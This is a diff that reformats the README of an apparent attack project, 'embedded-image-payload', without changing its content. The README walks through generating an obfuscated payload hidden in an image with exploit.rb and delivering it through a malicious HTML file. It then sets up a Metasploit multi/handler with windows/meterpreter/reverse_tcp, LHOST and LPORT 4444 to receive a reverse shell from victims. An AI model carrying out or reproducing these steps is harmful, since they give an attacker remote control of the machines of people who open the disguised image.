@@ -11,25 +11,28 @@ Before proceeding with the installation, ensure that you have the following prer
 - Ruby programming language (version 2.7 or higher)
 - Metasploit framework
 
-If you don't have Ruby installed, you can download and install it from the official Ruby website: https://www.ruby-lang.org/
+If you don't have Ruby installed, you can download and install it from the official Ruby website: <https://www.ruby-lang.org/>
 
-To install the Metasploit framework, follow the installation instructions specific to your operating system. You can find the installation guide on the official Metasploit website: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
+To install the Metasploit framework, follow the installation instructions specific to your operating system. You can find the installation guide on the official Metasploit website: <https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html>
 
 Installation Steps
 ------------------
 
 1. Clone the repository:
-   ```
+
+   ```bash
    git clone https://github.com/your-username/embedded-image-payload.git
    ```
 
 2. Navigate to the project directory:
-   ```
+
+   ```bash
    cd embedded-image-payload
    ```
 
 3. Install the required dependencies using Bundler:
-   ```
+
+   ```bash
    bundle install
    ```
 
@@ -40,7 +43,8 @@ Installation Steps
    - Open the `payload.rb` file in a text editor and customize the payload generation and obfuscation techniques as needed.
 
 5. Generate the payload and embed it into the image:
-   ```
+
+   ```rb
    ruby exploit.rb
    ```
 
@@ -48,24 +52,33 @@ Installation Steps
 
 6. Set up the Metasploit handler:
    - Open a new terminal window and start the Metasploit console:
-     ```
+
+     ```bash
      msfconsole
      ```
+
    - Select the `exploit/multi/handler` module:
-     ```
+
+     ```rb
      use exploit/multi/handler
      ```
+
    - Set the payload to match the one used in the malicious HTML file:
-     ```
+
+     ```rb
      set PAYLOAD windows/meterpreter/reverse_tcp
      ```
+
    - Set the `LHOST` and `LPORT` options to specify the IP address and port for the reverse shell connection:
-     ```
+
+     ```rb
      set LHOST YOUR_IP
      set LPORT 4444
      ```
+
    - Start the handler:
-     ```
+
+     ```rb
      run
      ```
 
